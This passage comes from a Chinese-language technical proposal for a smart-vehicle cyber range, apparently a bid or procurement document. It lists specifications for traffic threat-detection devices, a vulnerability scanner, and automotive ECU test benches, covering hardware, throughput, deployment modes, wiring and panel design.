data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/09e974969db2fb368cde6075dcf0c0e0.png"></p><p>常见数据库高危操作行为分析：靶场定制全流量威胁检测设备支持对下列数据库的高危操作行为进行分析，并能自定义规则：</p><ol><li>mysql数据库</li><li>mssql数据库</li><li>oracle数据库</li><li>sybase数据库</li></ol><p>以下是截图：</p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/f8b81e31ebf91eb80f068b5e31fae004.png" alt="1705431808249"></p><p>可疑来源访问行为分析：靶场定制全流量威胁检测设备支持对可疑来源访问行为进行分析，展示下列信息并能自定义可疑来源：</p><ol><li>来源</li><li>源IP</li><li>资产IP</li><li>资产组</li><li>源地域</li><li>目的端口</li><li>URI</li></ol><p>以下是截图：</p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/89445655f91cf3460530ee59ed54bac7.png"><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/89445655f91cf3460530ee59ed54bac7.png"></p><p>告警的深度行为分析：靶场定制全流量威胁检测设备支持告警的深度行为分析，其中包括：</p><ol><li>DNS解析行为</li><li>TCP/UDP交互行为</li><li>WEB访问行为</li><li>传输文件行为</li></ol><p>受害资产分析：靶场定制全流量威胁检测设备支持以受害资产维度进行分析包括：</p><ol><li>资产分组</li><li>威胁级别</li><li>处于的攻击阶段</li><li>失陷状态</li><li>受到的攻击类型。</li></ol><p>以下是截图：</p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/59a0f6a9b26239ae72fda36fd7c1e91d.png"></p><p>攻击者画像分析：靶场定制全流量威胁检测设备支持对攻击者进行画像分析包括信息：</p><ol><li>资产的所有攻击</li><li>使用的攻击手段</li><li>所属组织</li><li>国家信息</li><li>地理位置</li></ol><p>系统安全检测：靶场定制全流量威胁检测设备支持系统安全检测，包括挖矿行为、未授权访问、暴力破解以及弱口令等细分维度。</p><h4 id="靶场定制应用协议威胁特征检测"><a href="#靶场定制应用协议威胁特征检测" class="headerlink" title="靶场定制应用协议威胁特征检测"></a>靶场定制应用协议威胁特征检测</h4><h5 id="功能实施方案-2"><a href="#功能实施方案-2" class="headerlink" title="功能实施方案"></a>功能实施方案</h5><ol><li>该设备配置强大，拥有16GB内存和1TB硬盘，为高性能网络处理和大规模数据存储提供了坚实基础。其2个千兆以太网管理接口、2个万兆以太网SFP+光接口（搭载了万兆多模光模块），以及3个接口扩展槽位，为各种网络连接提供了灵活性和可扩展性。这种硬件配置不仅确保了设备的处理性能，还为未来的网络扩展提供了充足的空间。</li><li>设备在HTTP处理性能方面表现卓越，支持高达5Gbps的HTTP吞吐量，同时能够处理100万的HTTP并发连接数和8万的每秒新建连接数。这保证了设备能够在高负载和高连接请求的环境中高效运行。而且，设备没有对站点数量设定上限，可灵活应对不同规模和数量的站点，为网络安全提供了广泛的保护。</li><li>设备提供多种工作模式，包括透明流模式、透明代理模式、反向代理模式、路由牵引模式、镜像检测模式以及镜像阻断模式。这种多样的工作模式允许管理员根据具体的网络配置和安全需求选择合适的模式，为网络的不同场景提供了个性化的防护策略。</li><li>通过BGP方式对流量进行牵引是设备的一项重要功能。通过这种方式，设备能够智能引导和处理流量，为网络提供更为精细的流量控制和防护。在清洗攻击后回注的过程中，设备还支持设置SNAT策略，为流量的回注提供了更多的灵活性和安全性。</li><li>设备提供强大的ARP管理功能，支持静态及动态ARP管理。通过对ARP的灵活管理，设备能够更好地处理网络中的地址解析请求，确保网络通信的正常进行。这对于设备在复杂网络环境中的稳定运行和高效通信至关重要。 ARP管理的静态和动态支持使得设备能够更加灵活地适应不同网络场景和需求。</li><li>该设备在保障HTTP协议安全性方面表现卓越，支持HTTP协议校验。这意味着管理员可以根据实际网络状况灵活地自定义协议参数合规标准，从而有效地过滤掉非法或异常的数据流。通过这一功能，设备能够更精确地检测和处理网络中的HTTP通信，提高网络安全性和合规性。</li><li>设备提供了扫描陷阱的设置功能，旨在有效防范恶意扫描。通过设置扫描陷阱，设备能够识别和阻止可能对网络进行扫描的恶意行为。这种主动的安全策略有助于提前发现潜在的威胁，防范网络攻击，为网络提供更为全面的安全保护。</li><li>设备支持页面访问顺序规则防护，通过监控和控制用户访问网页的顺序，有效防止可能的恶意行为。这项功能可以帮助阻断一些攻击者可能采用的特定访问顺序，从而提高网络对恶意行为的防御能力，保障网络的正常运行。</li><li>该设备支持流量安全事件与漏洞（CVE/BID/MSB）的对应关系，并支持对应关系的更新。这意味着管理员可以及时获取最新的漏洞信息，使设备能够更准确地检测并应对可能的安全威胁。更新流量安全事件与漏洞对应关系的机制，有助于设备不断适应网络安全态势的变化，提高网络的防护水平。</li><li>设备还支持流量安全事件与弱点（CWE）的对应关系，并支持对应关系的更新。这一特性使得设备能够更全面地理解网络中可能存在的弱点，并在检测到相关事件时，能够更为精确地识别和响应。对应关系的更新机制为设备提供了不断进化和适应的能力，确保了网络安全的持续性。</li><li>该设备在流量安全事件方面支持可理解的描述，管理员能够更加直观地了解网络中发生的安全事件。通过清晰的描述，管理员可以轻松理解事件的性质、影响和可能的威胁等关键信息。支撑管理员对于网络安全状态的理解，使其能够更迅速地采取适当的应对措施，确保网络的正常运行和安全性。</li><li>设备对流量安全事件进行标识时，涵盖了源MAC地址、目的MAC地址和VLAN号等关键信息。管理员可以清晰地了解事件发生的具体网络位置和参与的设备，为安全事件的定位和响应提供了有力的支持。通过标识这些关键信息，设备有助于提供更为详细和全面的事件上下文，使管理员更容易追踪、分析和处理安全事件。这种细致入微的标识方式有助于提高网络安全管理的效率和准确性。</li></ol><h5 id="技术实现内容-2"><a href="#技术实现内容-2" class="headerlink" title="技术实现内容"></a>技术实现内容</h5><p>功能参数设计为，内存16G，硬盘1T，以太网千兆管理接口2个，万兆以太网SFP+光接口（含万兆多模光模块）2个，接口扩展槽位3个。HTTP吞吐量5Gbps，HTTP并发连接数100万、每秒新建连接数8万，无限制保护网站站点数量。支持透明流模式、透明代理模式等多种部署模式。通过BGP方式对流量进行牵引，静态及动态ARP管理。HTTP协议校验，设置扫描陷阱，页面访问顺序规则防护。流量安全事件与漏洞、弱点的对应关系更新，流量安全事件标识。</p><p>设备选择：靶场定制应用协议威胁特征检测设备采用内存容量16GB，硬盘容量1TB。设备支持配备两个千兆以太网管理接口，三个接口扩展槽位以及两个万兆以太网SFP+光接口（包括万兆多模光模块）。</p><p>性能参数：靶场定制应用协议威胁特征检测设备支持无限制的网站站点数量。且HTTP处理速度可达到每秒5G字节。并且HTTP并发连接数不低于100万。同时经过检测，该设备可支持的HTTP每秒新建连接数大于等于8万。</p><p>模式与功能支持：靶场定制应用协议威胁特征检测设备能够通过BGP方式对流量进行牵引，在通过攻击清洗后再将其返回。它还能提供动态ARP管理以及静态ARP管理的功能。还能够支持镜像阻断、镜像检测、路由牵引、透明流、透明代理以及反向代理模式。并且在回注的过程中，可以配置SNAT策略。</p><p>协议校验与防护：靶场定制应用协议威胁特征检测设备能够设置扫描陷阱，以防止恶意扫描。还能够进行HTTP协议校验，用户可以自定义协议参数要求合规标准，并过滤非法数据。此外还能够进行页面访问顺序规则防护。</p><p>安全事件与漏洞对应关系：靶场定制应用协议威胁特征检测设备提供流量安全事件与漏洞的对应关系，其中包括了CVE漏洞编号、BID漏洞编号以及MSB漏洞编号。除此之外，该系统还能够给出流量安全事件与弱点，也就是CWE编号的对应关系，提供对流量安全事件的的清晰描述，并且这些对应关系都能够实时更新。</p><p>流量安全事件标识：靶场定制应用协议威胁特征检测设备支持识别流量中的安全事件，并给出安全事件的VLAN号、目的MAC地址以及源MAC地址等标识信息。</p><h4 id="靶场定制多层协议异常特征检测"><a href="#靶场定制多层协议异常特征检测" class="headerlink" title="靶场定制多层协议异常特征检测"></a>靶场定制多层协议异常特征检测</h4><h5 id="功能实施方案-3"><a href="#功能实施方案-3" class="headerlink" title="功能实施方案"></a>功能实施方案</h5><ol><li>该设备具备卓越的端口配置，包括千兆电口8个、千兆光口8个、万兆光口8个，并提供5个设备扩展槽位，支持40G光接口的灵活扩展。这种丰富的端口组合和扩展选项，使其能够适应不同网络环境和需求，为用户提供高度的灵活性和可扩展性。</li><li>在存储和电源方面，该设备配置了两块480GB SSD硬盘、两块可插拔模块化交流电源以及两块可插拔模块化风扇。这种设计不仅提供了可靠的数据存储支持，还为设备提供了强大的电源和散热系统，确保设备在长时间运行中能够保持高性能和稳定性。</li><li>该设备在应用层性能方面表现卓越，具有全威胁应用层吞吐量达到15Gbps的强大性能。同时，设备支持1500万的并发连接数和20万/秒的新建连接数，为网络提供了出色的连接管理和性能响应。这使得设备能够在高流量和高连接密度的环境中保持卓越的性能表现。</li><li>设备支持灵活的部署模式，包括路由模式、透明模式和混合模式。用户可以根据网络架构和安全需求选择最适合的模式，以实现最佳的网络安全防护效果。此外，设备提供16个虚拟授权数量，并配置全接口防护授权，为用户提供了全面的网络安全保障。</li><li>该设备拥有庞大而全面的威胁特征库，包括8000个攻击特征、600万个病毒特征以及支持的协议识别数量高达5500。这意味着设备能够有效检测、识别和防御多种网络威胁，为网络提供强大的安全保护。这种全面的特征库覆盖，使得设备能够适应不断演变的网络威胁形势，确保网络处于安全的状态。</li><li>设备提供强大的病毒检测功能，集成了第三方专业防病毒厂商的专业病毒库。这意味着设备能够实时监测网络流量，检测并阻止潜在的病毒攻击，保障网络中的终端设备免受恶意软件的侵害。通过与专业病毒库的集成，设备能够及时应对不断演进的病毒威胁，为网络提供高效的安全保护。</li><li>该设备具备对IPv6协议的全面支持，并提供基于IPv6的流量威胁识别功能。特征库支持手动和自动升级两种方式，确保设备始终具备最新的IPv6威胁信息。这种支持对IPv6的全面覆盖，使得设备能够适应不断增长的IPv6网络，有效保护企业网络免受IPv6环境下的潜在威胁。</li><li>设备提供报文示踪功能，支持真实流量、导入报文、构造报文三种模式进行流量诊断。用户可以通过这一功能追踪和分析网络中的流量，进行准确的流量诊断。设备同时是支持网络数据报文捕获功能的，捕获过后能导出为cap格式文件，为后期对系统数据的分析处理做基础数据支持。这种灵活的流量分析功能，有助于用户深入了解网络中的流量状况，及时应对潜在的网络威胁。</li><li>设备提供流量安全事件与漏洞（CVE/BID/MSB）的对应关系，并支持对应关系的更新。通过建立流量安全事件与漏洞的对应关系，设备能够更准确地识别潜在的网络威胁，为网络管理员提供更为详实的安全事件信息。定期更新对应关系，设备能够及时应对新出现的漏洞威胁。</li><li>设备同样支持流量安全事件与弱点（CWE）的对应关系，并支持对应关系的更新。这种对应关系的建立使得设备能够更全面地分析流量中的安全事件，提高对潜在威胁的检测和识别准确性。设备通过对弱点的关联，帮助网络管理梳理网络中存在的潜在风险，从而采取有效的安全措施。</li><li>该设备在处理流量安全事件时提供了可理解的描述，使网络管理员能够直观、清晰地了解事件的性质和影响。通过提供可理解的描述，设备不仅仅是报告了发生的安全事件，更是提供了详细的信息，有助于管理员迅速作出正确的响应。这种可理解的描述有助于提高网络安全运营的效率，减少了管理员对于事件分析的复杂性。</li><li>流量安全事件标识是设备为了更加精准地描述和标记安全事件而采取的措施。这些标识包括源MAC地址、目的MAC地址和VLAN号等信息，为每个安全事件提供了独特的身份标识。通过这些标识，网络管理员可以追踪和识别每个事件的来源和影响范围，从而更好地了解网络中的安全威胁。这种细致入微的标识方式有助于提高对安全事件的溯源和管理精度，增强了网络安全的可视性。</li></ol><h5 id="技术实现内容-3"><a href="#技术实现内容-3" class="headerlink" title="技术实现内容"></a>技术实现内容</h5><p>功能参数设计为，配置千兆电口8个，千兆光口8个，万兆光口8个，设备扩展槽位5个，支持40G光接口扩展。配置2块480GB SSD硬盘，2块可插拔模块化交流电源，2块可插拔模块化风扇。整机应用层吞吐量15Gbps，支持并发连接数1500万，新建连接数20万/秒。虚拟授权数量16，全接口防护授权。攻击特征库数量8000，病毒特征库数量600W。支持病毒检测功能，IPv6协议支持。报文示踪功能。流量安全事件与漏洞、弱点的对应关系更新。</p><p>硬件配置：配备了八个万兆光口、八个千兆电口以及八个千兆光口，同时还具备五个可扩展设备槽位，拥有四十个G光接口扩展。其配置还包括两块480GB SSD硬盘，支持灵活扩容，以满足数据存储需求。此外，该设备还搭载了两块可以轻松更换的模块化交流电源和两块可插拔的模块化风扇，以增强系统的可维护性和稳定性。</p><p>性能要求：靶场定制多层协议异常特征检测设备应用层吞吐量（全威胁应用层吞吐）大于15Gbps，满足高吞吐量的数据采集需求。并发连接不低于1500万，新建连接数支持不少于20万/秒，设备满足对大量并发连接的负载及处理。</p><p>授权与防护：靶场定制多层协议异常特征检测设备配置虚拟授权数量不低于16个，并提供全接口防护授权，以确保系统的安全性和可靠性。</p><p>部署模式：支持混合模式部署、透明模式部署以及路由模式部署，以适应各种网络环境。</p><p>特征库与病毒检测：靶场定制多层协议异常特征检测设备拥有超过600万个病毒特征库以及8000个以上的攻击特征库，以提供全面的安全防护能力。同时可以对接第三方病毒库，如专业防病毒厂商，集成操作步骤简便，使设备的专业的病毒检测功能更加完善。</p><p>升级方式：支持手动、自动升级两种方式，以确保特征库的及时更新。</p><p>IPv6支持与报文分析：靶场定制多层协议异常特征检测设备具备通过IPv6的流量进行威胁识别功能，以适应不同网络环境的需求。具备报文示踪功能，失踪诊断可以通过构造报文、导入报文以及真实流量这几种模式来诊断。还能够进行以cap包格式导出捕获的报文，以方便流量分析和安全事件的识别。</p><p>安全事件与漏洞对应关系：靶场定制多层协议异常特征检测设备支持查看流量安全事件与漏洞的对应关系，其中漏洞包括了CVE漏洞编号、BID漏洞编号以及MSB漏洞编号，并支持对应关系的更新，以提供全面的安全事件识别和漏洞管理能力。</p><p>安全事件描述：靶场定制多层协议异常特征检测设备支持流量安全事件的可理解描述，以便用户能够更好地理解和处理安全事件。</p><h4 id="靶场定制漏洞特征采集"><a href="#靶场定制漏洞特征采集" class="headerlink" title="靶场定制漏洞特征采集"></a>靶场定制漏洞特征采集</h4><h5 id="功能实施方案-4"><a href="#功能实施方案-4" class="headerlink" title="功能实施方案"></a>功能实施方案</h5><ol><li>该扫描设备采用1U高的机架式硬件架构，搭载8GB内存和2TB硬盘，计算资源和存储资源充足。机架式设计使其在数据中心或机房等环境中占用空间较小，同时提供足够的内存和硬盘空间，以支持扫描设备的正常运行和数据存储需求。配置6个千兆以太网电口，同时支持1个接口扩展槽位，以满足多样化的网络接入需求。</li><li>扫描设备支持最大可扫描128~1024个IP地址的范围，具备灵活的IP地址范围设置功能。此外，设备配置支持128个IP地址或域名的授权，允许用户定义需要进行扫描的具体目标范围，以满足不同网络规模和需求。这种高度可定制的IP地址和域名授权功能有助于用户更加灵活地规划和执行扫描任务，确保覆盖到目标网络的所有重要部分。</li><li>该扫描设备系统支持国产操作系统和数据库的扫描，包括中标麒麟、凝思、华为欧拉、深度、中科RedFlagLinux等国产操作系统，以及神通、人大金仓、南大通用、达梦等国产数据库。这意味着设备可以全面覆盖国内主流的操作系统和数据库类型，为用户提供广泛的适用性。支持国产操作系统和数据库的扫描，有助于满足用户在不同环境中的安全审计和漏洞扫描需求，确保对国内信息系统的全面安全检测。</li><li>该扫描设备系统具备自适应网络扫描功能，能够智能地根据当前网络状况自动调整发包速率，从而有效减少对用户网络的影响。这一特性使得设备在执行扫描任务时更加智能和灵活，能够在确保扫描效果的同时最大程度地减少网络流量的干扰，提升了扫描的实用性和用户体验。</li><li>系统支持与微软WSUS（Windows Server Update Services）补丁系统的联动，实现了与微软官方补丁管理系统的集成。这使得扫描设备能够方便地进行自动化的补丁修补，及时获取并应用最新的安全补丁。通过与WSUS系统的协同工作，用户可以更加便捷地管理系统的漏洞和安全补丁，保障系统的安全稳定。</li><li>扫描设备系统内置多种实用的诊断工具，包括PING、Traceroute、端口探测、Tcpdump抓包、故障信息收集、一键诊断等。这些工具为用户提供了丰富的诊断手段，可以帮助用户在发现问题时快速定位和解决。无论是网络连通性问题、故障排查还是流量分析，用户都可以通过设备内置的诊断工具迅速进行问题诊断和解决，提高了系统的可维护性和用户操作的便捷性。</li></ol><h5 id="技术实现内容-4"><a href="#技术实现内容-4" class="headerlink" title="技术实现内容"></a>技术实现内容</h5><p>功能参数设计为，1U高机架式硬件架构，8G内存，2T硬盘，6个以太网千兆电口，1个接口扩展槽位。可扫描128~1024个IP地址，配置128个IP地址或域名授权。支持国产操作系统、数据库扫描。自适应网络扫描，微软WSUS补丁系统联动。自带诊断工具，方便快速定位问题。</p><p>硬件配置：靶场定制漏洞特征采集设备采用1U高的机架式硬件架构，硬盘容量配置2T，内存配置8G，该设备完全满足数据存储需求。并且配置了6个以太网千兆电口，并且具备1个可扩展的接口槽。</p><p>扫描能力与授权：靶场定制漏洞特征采集设备最大可扫描128~1024个IP地址，提供灵活的IP地址范围配置。可配置128个IP地址或域名授权，以满足对目标网络的全面扫描需求。</p><p>国产操作系统与数据库支持：靶场定制漏洞特征采集设备可用于扫描国产操作系统，涵盖了中科RedFlagLinux操作系统、深度操作系统、中标麒麟操作系统、凝思操作系统以及华为欧拉操作系统。还支持扫描数据库，涵盖了达梦、南大通用、神通和人大金仓等数据库</p><p>自适应网络扫描与补丁联动：靶场定制漏洞特征采集设备支持自适应网络扫描功能，可以通过智能的调整发包频率，从而降低对用户网络的影响。此外，它还兼容微软WSUS补丁系统，使得补丁修复能够自动进行，从而增进系统的整体安全性。</p><p>自带诊断工具：靶场专用漏洞特征采集设备内置了一套诊断工具，涵盖了一键诊断功能、Traceroute工具、Tcpdump抓包功端口探测工具、故障信息收集功能以及PING工具等功能，以方便用户快速定位和解决问题。</p><h1 id="智能汽车网络靶场车型测试台架"><a href="#智能汽车网络靶场车型测试台架" class="headerlink" title="智能汽车网络靶场车型测试台架"></a>智能汽车网络靶场车型测试台架</h1><h2 id="技术路线-1"><a href="#技术路线-1" class="headerlink" title="技术路线"></a>技术路线</h2><h3 id="产品外观"><a href="#产品外观" class="headerlink" title="产品外观"></a>产品外观</h3><p>本方案为汽车网络靶场提供7套测试台架，测试台架采用定制外观，外观结合新能源logo设计风格及配色进行定制设计，测试台架按照可布置20个控制器进行分区隔断设计，台架尺寸设计为2600mm*1200mm*2000mm,为考虑方便测试人员办公，台架桌面尺寸设计为2600mm*600mm，可同时容纳2个测试人员办公，台架桌面下方配备独立的电源设备区用来放置电源。</p><h4 id="功能实施方案-5"><a href="#功能实施方案-5" class="headerlink" title="功能实施方案"></a>功能实施方案</h4><p>为了满足不同类型的测试需求，设计的测试台架设备采用了灵活的架构，可以根据实际情况进行调整。在最大化利用空间的同时，该设备能够容纳多达20个控制器，这样的配置使得它可以同时对多个设备进行测试，极大地提升了测试效率。无论是在进行单一控制器的精准测试，还是在执行多控制器的综合测试中，这套台架设备都能够提供稳定可靠的测试环境。</p><p>在设计这款先进的测试台架时，充分考虑了实验室空间的合理利用。整个台架的尺寸被精心设计为不超过2650mm x 1200mm x 2050mm（长x宽x高），以确保它能够适应多数工作环境。尤其值得一提的是，台架的桌面部分，它的尺寸达到2650mm x 600mm，这样的宽敞尺寸为放置测试仪器和设备提供了充足的空间，同时也便于操作人员进行各项操作。这种设计不仅满足了功能性的需求，还考虑到了用户的便利性，使得测试工作可以更加高效、有序地进行。</p><p>产品设计中，考虑到多任务同时进行的工作效率，台架被设计得相当宽敞，能容纳2个工位。两位技术人员可以同时在同一个台架上工作，而不会互相干扰，从而提高了工作效率和团队协作的可能性。</p><p>为了提高工作效率并确保安全性，精心设计的台架应配备独立的电源设备放置区域。这个专门的区域旨在存放所有必要的电源设备，且其设计确保不与零部件区域重叠，从而避免了电源线和零部件的混乱，确保了工作台的整洁和有序。这样的布局同时也有助于减少电磁干扰，提升设备运行的稳定性。</p><p>的网络布局设计中考虑到了高速数据传输的需求，因此每个台架都配备了1个5口千兆交换机。这样的配置可以确保台架上的设备之间进行快速、高效的数据交换，支持繁重的数据流量，满足现代测试环境中对于数据处理速度的严格要求。</p><p>产品指标参数信息如下：</p><ol><li>测试台架设备可最大布置20个控制器；</li><li>台架尺寸不超过2650mm x 1200mm x 2050mm（长x宽x高），其中桌面尺寸至少2650mm x 600mm ；</li><li>台架应能容纳2个工位；</li><li>台架应配备独立的电源设备放置区域，不占据零部件区域；</li><li>每个台架配备1个5口千兆交换机，type-c供电接口，交换容量10Gbps，交换机信息如下：</li></ol><p>品牌：华为</p><p>型号：S110-5T</p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/ab108950b88948e20f2f182773ed497d.png"></p><h4 id="技术实现内容-5"><a href="#技术实现内容-5" class="headerlink" title="技术实现内容"></a>技术实现内容</h4><ol><li>硬件设计</li></ol><p>控制器布置：台架应能够布置20个控制器。</p><p>台架整体尺寸：2650mm x 1200mm x 2050mm（长x宽x高）。</p><p>工作桌面尺寸：2650mm x 600mm。</p><ol><li>工位配置</li></ol><p>工位容量：台架应能容纳2个工位，以便同时进行多项测试。</p><ol><li>电源管理</li></ol><p>电源设备区域：台架应配备独立的电源设备放置区域，以避免与测试零部件区域混合。</p><ol><li>网络设备</li></ol><p>网络设备：每个台架配备1个5口千兆交换机，以满足网络连接需求。</p><ol><li>结构设计</li></ol><p>材料选择：采用高强度钢材，确保结构稳定性和耐用性。</p><p>层架设计：台架分为多层，上层用于放置控制器，下层用于电源设备和网络设备的安置。</p><p>防静电处理：工作台面进行防静电处理，防止静电损害敏感设备。</p><ol><li>工位布局</li></ol><p>人体工程学设计：工位设计考虑人体工程学，确保测试人员的舒适性。</p><p>灵活配置：工位之间采用可移动隔板，根据测试需求灵活调整空间。</p><ol><li>电源管理</li></ol><p>独立电源区：设计独立的电源设备区域，配备必要的插座和电源线路管理系统。</p><p>安全保护：电源区域配备漏电保护和过载保护装置。</p><ol><li>网络连接</li></ol><p>集中交换机布置：在台架中心位置设立网络设备区，集中管理网络连接。</p><p>线路管理：内置线缆管理系统，确保网络线路的整洁和安全。</p><ol><li>辅助功能</li></ol><p>监控摄像头：在台架上方配备监控摄像头，用于记录测试过程。</p><p>照明系统：提供足够的照明设备，保证工位光线充足。</p><ol><li>技术规格</li></ol><p>承重能力：台架每层承重不低于100kg，确保可以安全放置各种测试设备。</p><p>耐用性：台架表面采用耐磨材料，保证长期使用下的耐用性。</p><p>网络带宽：千兆交换机保证网络测试时的高速数据传输。</p><ol><li>安全措施</li></ol><p>防撞角设计：台架各角采用圆滑处理或加装防撞角，避免操作人员受伤。</p><p>静电放电系统：设计静电放电系统，减少静电干扰和损害。</p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/8c6443a8cd244f5803a7cd73eb51a918.png"></p><p>（测试台架外观设计图）</p><h3 id="台架布线"><a href="#台架布线" class="headerlink" title="台架布线"></a>台架布线</h3><h4 id="功能实施方案-6"><a href="#功能实施方案-6" class="headerlink" title="功能实施方案"></a>功能实施方案</h4><p>台架设计中，对于线束管理采取了严格的标准化流程，确保台架内所有线束均遵循国际标准，并且不裸露在外面，以维护工作环境的安全性和整洁性。台架内部线束布局合理有序，通过精心设计的线路规划，主要线束都做好了线号标记，这样不仅美观，还大大方便了工程师在日后的维护和排查问题时的效率,并且提高了台架的通用性。</p><p>测试台架上，所有控制器的布线与排布都是根据精心设计的网络拓扑结构来执行的。这样的设计不仅确保了数据通信的效率和稳定性，而且也使得整个系统的故障诊断更为直观。为了让网络拓扑结构一目了然，采用了LED灯带方式或者其他直观的表示方法来呈现。这种视觉化的拓扑展示，不仅增强了操作的便利性，也提升了系统的美观度和现代感。</p><p>的服务中包含了提供高质量的零部件，特别是针对车载以太网的连接需求，提供了专门的线材。这些线材经过严格的测试，以确保它们能够在车辆内部提供稳定且高速的数据传输。</p><p>产品指标信息如下：</p><ol><li>提供的台架内所有线束均遵循国际标准，线束不裸露在外面，台架内部线束布局合理有序，主要线束做好线号标记，方便排查问题。同时做好其他车型线束预留，方便其它车型共用台架。所有台架内部线束都布置在线槽内；</li><li>根据网络拓扑结构对控制器进行布线与排布，网络拓扑结构可通过LED灯带方式或者其他方式呈现；</li><li>配备零部件车载以太网连接线材。</li></ol><h4 id="技术实现内容-6"><a href="#技术实现内容-6" class="headerlink" title="技术实现内容"></a>技术实现内容</h4><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/061c26ac02f3d25f8a8b57986906016e.png" alt="IMG_256"></p><p>台架上挂置的零部件设备需要通过台架进行线路连接，包含进线和出线口设计，本次方案所使用的台架走线方式采用背板走线，在台架零部件放置区域背板处都单独设计有接口和线槽，在零部件放置时需先通过接口进行线路的穿接，将线束引至背板，在将线束固定在线槽里面，保证美观的同时也方便后期的维护。</p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/3ac64205f7a714f3965c0fd258dac051.png" alt="IMG_256"></p><h3 id="台架面板"><a href="#台架面板" class="headerlink" title="台架面板"></a>台架面板</h3><h4 id="功能实施方案-7"><a href="#功能实施方案-7" class="headerlink" title="功能实施方案"></a>功能实施方案</h4><ol><li><p>设备配备了丰富的接口，以满足多样化的连接需求。具体来说，设备上有16路CAN接口，采用DB9型连接器，确保与车辆通讯协议的兼容性。此外，还配备了12个以太网接口，使用RJ45连接器，方便网络的构建和扩展。USB接口有2个，便于连接外部存储设备或其他USB设备。为了提供电源连接的灵活性，设备还设计了8个插口的插排，这些插口支持3孔和2孔插头，满足了不同设备的电源接入需求。这样全面的接口配置，使得设备能够适应各种不同的工作环境和任务要求。</p></li><li><p>产品设计中考虑到了车载系统与传统网络之间的无缝对接，因此具备了2个车载以太网转传统以太网的调试接口。这样的设计使得工程师能够轻松地进行车载网络与传统网络之间的数据交换和调试工作。面板上预留了T1和TX接口，用户可以根据需要在接口面板上实现不同类型网络接口的转换，这种预留方案为未来的升级和扩展提供了可能。</p></li><li><p>设计的测试台架设备在实验台与电控系统、负载开关以及机柜本体之间的连接上，采用了用户友好的接插件端子台形式。端子台上使用不同尺寸的香蕉插座作为不同信号的接口，如电源接口使用M4尺寸的香蕉插座、各种信号接口使用M2尺寸的香蕉插座。这种设计允许用户在接入端子台时无需借助任何工具，就可以方便快捷地进行连接或断开，极大地简化了测试过程中的操作。这一特点尤其在更换电控系统、真实负载及真实开关时显得尤为重要，因为它能够大幅度提高工作效率，降低设备维护和测试过程中的时间成本。的目标是通过这种易于操作的接口设计，让用户能够更加专注于实验本身，而非消耗在繁琐的设备连接上。</p></li><li><p>测试台架设备具有极高的安装便利性和灵活性，试验台的设计允许控制器轻松地应用到不同的后续车型中。具体体现为：在整个台架中预留大量的电源接口及总线接口，接口数量远大于正常测试需求量（每个被测件放置位都有接口），且这些接口的线束已在台架内部完成布线及组网，这一独特的设计，在新车型的测试阶段，用户无需进行额外的改线布局，就能够在不同的总线之间灵活地移动和安装控制器。这样不仅减少了为适配新车型而进行的重复工作，也显著提升了测试台架的适用性和工作效率。</p></li><li><p>测试台架设备中，为了最大程度地方便测试人员的操作，精心设计了前面板。所有常用的测试接口，包括电源接口、CAN/CAN-FD/LIN接口以及诊断接口等，都被引至测试系统的前面板上，并且布局考虑到了操作的便捷性，确保了接口的高度位置合适，从而使测试人员能够轻松接入和操作，提升了测试工作的效率和舒适度。</p></li><li><p>为了确保测试系统的整洁性和维护的方便性，的设计将所有走线工作集中在台架的背面进行。这种布局不仅使前面板保持了清晰的界面，而且还保证了机柜后门的关闭与打开不会受到任何走线的影响，从而在不妨碍设备操作的同时，也便于后续的维护和检查。</p></li><li><p>测试系统中，所有的电子控制单元（ECU）和负载都设计为可以在系统正面通过标准的接插件进行快速更换，从而提高了维护和升级的效率。这种设计避免了使用额外工具的需求，使得操作人员能够轻松地进行组件的更换工作。同时，为了安全性和美观性，特别注意确保这些接插件在安装时不外露，既保护了接插件免受损害，又维持了测试系统的整洁外观。</p></li><li><p>在设计的测试系统中，所有ECU（电子控制单元）和负载的管脚信号，以及它们的扩展变型，都被精确地连接到了标准化的接插件上。这种配置不仅确保了信号的稳定和可靠传输，而且也为系统提供了必要的灵活性，以适应不同的测试需求和场景。通过使用标准接插件，简化了系统的组件互换过程，从而使测试平台能够快速适应多变的测试环境和不断发展的技术要求。</p></li><li><p>在设计试验台时，特别注意了布局的合理性，确保其与其他测试模块的硬件接口位置相匹配。这种精心的设计使得测试系统在调用控制时能够与相应的系统集成测试内容顺畅配合，从而有效地进行验证。这不仅提高了测试过程的效率，还确保了测试结果的准确性，使得整个验证过程更加高效和可靠。通过这种方式，试验台成为了一个集成的平台，能够支持复杂的系统级测试，并确保各个模块之间的无缝对接。</p></li><li><p>精心设计的试验台与机柜之间的连接系统是高度匹配的，采用了特定的接口来确保无缝对接。这种设计不仅提供了稳定可靠的连接，而且还充分考虑了操作的便捷性，使试验台能够同时与多个机柜连接，满足了复杂测试环境下的多任务需求。这种多机柜连接能力极大地提高了测试平台的灵活性和扩展性，使其能够适应各种不同的测试场景和工作负载，从而为用户提供了一个高效、可靠的测试解决方案。</p></li><li><p>设计团队在面板上精心设计了一个蜂窝区域，专门用于车机屏幕的挂载。这个蜂窝面板采用了低调的黑色设计，孔径精确为1厘米，与面板正面齐平，既美观又实用。为了确保操作的舒适性，蜂窝面板与桌面之间预留了5厘米的空距，这样不仅方便了设备的安装和维护，也保证了足够的通风空间，有助于散热。此外，为了提高设备的使用安全性，还特别注意到了防静电措施。面板上的防静电皮具有一个接地线，这个接地线直接连接至蜂窝板，有效地将静电引导至地面，从